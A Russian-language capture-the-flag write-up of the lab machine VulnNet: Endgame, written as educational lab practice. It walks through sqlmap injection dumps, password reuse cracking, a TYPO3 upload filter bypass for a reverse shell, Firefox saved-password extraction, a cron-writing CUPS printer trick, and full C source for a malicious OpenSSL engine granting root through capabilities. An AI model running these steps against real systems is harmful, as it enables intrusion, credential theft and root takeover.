### ДЛЯ РЕШЕНИЯ НЕОБХОДИМО:
- минимальное понимание js, си, апи эндпоинтов и их возможных уязвимостей, алгоритмов хеширования
- умение эксплуатировать sqli
- понимание принципа работы typo3
- знание о cups и его уязвимостях (чтобы понять, что тут он бесполезен)
- умение работать с кэшем мозиллы
- понимание capabilites и их уязвимостей, умение эксплуатировать ep у openssl

### ВЗЯТИЕ ШЕЛЛА:

по классике сначала сканим порты (масскан, потом нмап) - ничего интересного, все стандартно

<img width="700" height="276" alt="image" src="https://github.com/user-attachments/assets/58b0aea1-863d-4556-8e16-ea01a53afaff" />
<img width="700" height="317" alt="image" src="https://github.com/user-attachments/assets/dc46ea43-31e7-4943-b69f-2554a54b32f0" />

изменила домен в /etc/hosts на vulnnet.thm (по подсказке в задании) и попала на сайт

<img width="700" height="387" alt="image" src="https://github.com/user-attachments/assets/b16d0b83-8d49-4006-b21c-1ba410947776" />

сам сайт пустой, ничего не кликается, форма с регистрацией на сервер не отправляется(проверила через бурп). пофаззила поддиректории - ничего интересного (у тех, что выдают код 301 при переходе просто перекидывают на пустую страницу)

<img width="700" height="180" alt="image" src="https://github.com/user-attachments/assets/845c08b8-5bc9-4ecd-b091-c4d57be75357" />

решила пофаззать сабдомены и - бинго! нам выдало несколько. но админ1 и апи, к сожалению, выдают пустые страницы (и ничего не дают интересного, пофаззив, не увидела. пока только страницу логина на ```http://admin1.vulnnet.thm/typo3```. запомним)

<img width="700" height="412" alt="image" src="https://github.com/user-attachments/assets/90d43335-84dc-4b13-a6a2-7443c0f6805d" />

после перешла на сабдомен blog. сразу увидела потенциальный idor - но неа

<img width="700" height="114" alt="image" src="https://github.com/user-attachments/assets/8aeb0636-273e-42db-b00b-96f21a594199" />

решила полазить в коде страницы и в ```view-source:http://blog.vulnnet.thm/post5.php``` нашла вот такой путь к апи-эндпоинту:

<img width="700" height="160" alt="image" src="https://github.com/user-attachments/assets/3d9ec26f-7d20-4be3-8f57-a0d7b550dfab" />

решила его проверить, и да, действительно, он не защищен и мы можем спокойно на него попасть

<img width="700" height="190" alt="image" src="https://github.com/user-attachments/assets/cf67a683-1a9b-4559-b10f-bf130a231efb" />

попробовала проверить на уязвимость к sqli и да, параметр blog уязвим. теперь посмотрим, какие есть базы данных

```
sqlmap -u "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=5" \
--batch \
--level 3 --risk 2 \
--random-agent \
--threads 5 -dbs
```

всего видим три:

```
available databases [3]:
[*] blog
[*] information_schema
[*] vn_admin
```

сначала решила посмотреть бд blog (```-D blog```):

```
Database: blog
[4 tables]
+------------+
| blog_posts |
| details    |
| metadata   |
| users      |
+------------+
```

посмотрела все таблицы на всякий случай, но самое интересное нашла в дампе таблицы users (```-D blog -T users --dump```). в ней оказались пароли всех пользователей блога (у меня начало вывода обрезалось, решается флагом --start 1). окей, пока форму логина я на сайте не видела, да и обычные пользователи нас особо не интересуют (но то что пароли хранятся незахешированными - вкусно, хотя и малореалистично)

<img width="700" height="250" alt="image" src="https://github.com/user-attachments/assets/a564023c-bede-4577-a59d-c557ff062a93" />

дальше решила посмотреть дб vn_admin

```
+---------------------------------------------+
| backend_layout                              |
| be_dashboards                               |
| be_groups                                   |
| be_sessions                                 |
| be_users                                    |
| fe_groups                                   |
| fe_sessions                                 |
| fe_users                                    |
| sys_log                                     |
| ...                                         |
+---------------------------------------------+
```
cудя по специфическим названиям таблиц (be_, fe_, sys_), - похоже на бд от CMS (TYPO3). окей, попробуем сдампить самое интересное - логины/хэши паролей админов (```-D vn_admin -T be_users --dump```)

<img width="700" height="51" alt="image" src="https://github.com/user-attachments/assets/efb59e17-e323-4afb-a6fb-4675c20409aa" />

и вот оно - хеш пароля. но радоваться пока нечему;( захеширован пароль алгоритмом $argon2i$, а параметры в (m=65536 — 64 МБ памяти, t=16 — 16 итераций) делают его очень неприятным. сломать его будет сложно (я на стадии отрицания закинула на минут пятнадцать в john'а с rockyou, надеясь, что пароль может быть где-то в начале словаря, но неа. так что таким образом пароль не достать). полазив еще по таблицам и не найдя ничего толкового, подумала, что в теории, паролем админа может быть один из паролей в таблице users (из блога). юзернейма (chris_w) его там нет, но пароль он вполне мог использовать дважды. составила файл с паролями и закинула в джона

```
john --wordlist=pass.txt hash.txt
```

и, ура, мы действительно смогли таким образом расхешировать пароль. далее перешла на ранее найденную страницу ```http://admin1.vulnnet.thm/typo3``` и залогинилась по полученным кредам. теперь мы chris_w! остается получить реверсшелл и попасть на сервер. самое логичное - подгрузить php файл в filelist, но расширения запрещено. но в настройках (system tools -> settings) я увидела configure installiation-wide options - бинго. 

<img width="700" height="403" alt="image" src="https://github.com/user-attachments/assets/180ad0f3-03ab-4f17-9a7f-accfd3e9afc9" />

удаляем запрет на подгрузку php в параметре ```[BE][fileDenyPattern]```и спокойно подгружаем скрипт с реверсшеллом (я сгенерировала его через msfvenom, чтобы поймать шелл в msfconsole)

<img width="700" height="311" alt="image" src="https://github.com/user-attachments/assets/0560a4d5-8805-42be-b4da-15b3c0d68527" />

переходим по адресу ```http://admin1.vulnnet.thm/fileadmin/user_upload/rceraw.php``` и вот, теперь мы внутри с правами юзера www-data

### Взятие юзера

видим, что user.txt взять не можем, он лежит у пользователя system. видимо, сначала придется брать его. подгрузила на сервер линпис (можно через метерпретер в мсфконсоли, можно просто поднять питоновский сервер). 

и, для полноты картины, опишу свою бессмысленную и беспощадную борьбу с 631 портом

```
══╣ Active Ports (ss) (T1049)                                                                             
tcp   LISTEN  0       80                 127.0.0.1:3306           0.0.0.0:*                               
tcp   LISTEN  0       128            127.0.0.53%lo:53             0.0.0.0:*     
tcp   LISTEN  0       128                  0.0.0.0:22             0.0.0.0:*     
tcp   LISTEN  0       5                  127.0.0.1:631            0.0.0.0:*     
tcp   LISTEN  0       511                        *:80                   *:*     
tcp   LISTEN  0       128                     [::]:22                [::]:*     
tcp   LISTEN  0       5                      [::1]:631               [::]:*
```
увидев 631 порт, сразу почему-то подумала, что пользователь system будет состоять в группе lpadmin(и, кнчн, ниче не проверила. видимо, простые машины уже привили привычку, что если есть что-то подозрительное - это сработает. отстой), а этот вектор атаки понадобится в будущем для повышения привилегий до рута через веб-интерфейс для администрирования принтеров, ака cups. подгрузила статически скомпилированный сокат на машину, дала права на исполнение и пробросила порт (```./socat TCP-LISTEN:9999,fork,reuseaddr TCP:127.0.0.1:631```). теперь можно зайти в интерфейс из браузера (```http://ip:9999```). но попала я на страничку bad request из-за защиты от DNS rebinding. через бурп поменила хоста на localhost и наконец оказалась внутри интерфейса. перешла во вкладку administration, чтобы отредактировать cupsd.conf и добавить в него ```FileDevice Yes``` (чтобы можно было создавать принтеры, которые сохраняют печать в локальные файлы, надеясь провести атаку вроде:

```
lpadmin -p pwn_printer -E -v file:/etc/cron.d/root_shell -m raw # создаем принтер, который записывает сырые данные(без шрифтов и тп) в кронтабы, сразу включаем его
echo "* * * * * root chmod +s /bin/bash" | lp -d pwn_printer
```
там у меня запросили креды, и я, уверенная, что подготовилась к взятию рута, пошла искать способ повыситься до system. уже потом до меня доперло, что у system нужной группы нет, да и креды от юзера не подошли, так что файл так и остался неотредактированным. а теперь к более успешным решениям. в домашней папке system можно заметить интересную скрытую директорию - в ней находится кэш мозиллы, где можно, в теории, найти креды (это работает в основном в мозилле и в старых версиях хрома)

```
www-data@vulnnet-endgame:/home/system/.mozilla$ ls -la
total 16
drwxr-xr-x  4 system system 4096 Jun 14  2022 .
drwxr-xr-x 18 system system 4096 Jun 15  2022 ..
drwxr-xr-x  2 system system 4096 Jun 14  2022 extensions
drwxr-xr-x  7 system system 4096 Jun 14  2022 firefox
```

поднимаем в директории питоновский сервер и скачиваем папку firefox к себе на хост (```wget -r http://ip:port```), а дальше с помощью утилиты firefox_decrypt (вгетим ее с гитхаба) пытаемся достать оттуда креды: ```python firefox_decrypt.py path/firefox```, но видим вот такую картину в обоих вариантах

```
┌──(sksiiiwei㉿pashalkaGOJO)-[~/Downloads/firefox_decrypt]
└─$ python3 firefox_decrypt.py /tmp/10.48.131.27:5555/firefox
Select the Mozilla profile you wish to decrypt
1 -> 2o9vd4oi.default
2 -> 8mk7ix79.default-release
2
2026-05-02 00:52:55,505 - ERROR - Couldn't find credentials file (logins.json or signons.sqlite).
```
хотя если посмотреть в директории firefox, то профиля у нас три

```
ls -la firefox      
total 12
drwxrwxr-x  7 olya olya 200 May  2 00:45  .
drwxrwxr-x  4 olya olya 100 May  2 00:45  ..
drwxrwxr-x 13 olya olya 920 May  2 00:46  2fjnrwth.default-release
drwxrwxr-x  2 olya olya  80 May  2 00:46  2o9vd4oi.default
drwxrwxr-x 13 olya olya 920 May  2 00:47  8mk7ix79.default-release
drwxrwxr-x  3 olya olya 100 May  2 00:47 'Crash Reports'
...
-rw-rw-r--  1 olya olya 259 Jun 14  2022  profiles.ini
```

заходим в profiles.ini и видим - один из них действительно не инициализирован (либо она пустая и поэтому firefox стер ее профиль, либо кто-то вручную подчистил файл. но тк она не пустая, то автор походу просто очень пытается усложнить решающим жизнь)

<img width="870" height="329" alt="image" src="https://github.com/user-attachments/assets/d7eb0670-1f3b-4a23-975b-07d04a9a4355" />

инициализируем самостоятельно

```
[Profile2]
Name=default-release
IsRelative=1
Path=2fjnrwth.default-release
```

снова запускаем firefox_decrypt, выбираем нужный профиль и на этот раз действительно находим креды. они не от system, а от thm, но из-за реюза пароля мы спокойно подрубаемся к пользователю system

### ВЗЯТИЕ РУТА

долго копалась в системе, пока не заметила в выводе линписа вот такую вещь:

```
Files with capabilities (limited to 50):
/home/system/Utils/openssl =ep
/snap/core20/1081/usr/bin/ping = cap_net_raw+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```
а конкретно openssl ```=ep``` (знак ```=ep``` без указания конкретного имени означает, что программе даны вообще все возможные права (аналог root)). то есть нам нужно использовать внутренние функции openssl, которые пишем exploit.c

```
#include <openssl/engine.h>
#include <unistd.h>
#include <stdlib.h> 

static int getroot(ENGINE *e, const char *id) // для соответствия сигнатуре функции
{
  setuid(0); 
  setgid(0);
  system("/bin/bash");
  return 1;
}

IMPLEMENT_DYNAMIC_BIND_FN(getroot) // экспортирует функцию под стандартным именем, которое ожидает увидеть ядро OpenSSL. без этого макроса библиотека не поняла бы, какую функцию вызывать при загрузке.
IMPLEMENT_DYNAMIC_CHECK_FN() // экспортирует служебную функцию, которая проверяет версию API OpenSSL. необходимо для совместимости: OpenSSL проверяет, совпадает ли версия API, с которой был скомпилирован движок, с версией самой библиотеки. Без этого макроса загрузка завершится ошибкой.
```
(логика составления кода исходит из ожиданий openssl, чтобы ничего не поломалось. типа: если пользователь хочет загрузить динамический движок (engine), я должен загрузить файл и найти в нем функцию с конкретным именем bind_engine. нам не нужно использовать что-то вроде ```__attribute__((constructor))```, чтобы сразу вызвать функцию, потому что openssl c флагом -engine сразу вызывает функцию для ее инициализации)
```
// примерно так это выглядит после работы макроса (для понимания):
extern "C" int bind_engine(ENGINE *e, const char *id) {
    return getroot(e, id); 
}
```
компилируем у себя (тк на сервере рабочего компилятора нет)

```
gcc -fPIC -shared -o exploit.so exploit.c -lcrypto
```
перекидываем файл на сервер и запускаем 

```
/home/system/Utils/openssl req -engine ./exploit.so // подгружаем скомпилированный модуль, который должен сразу запустить оболочку с правами рута
```
рут взят!😎
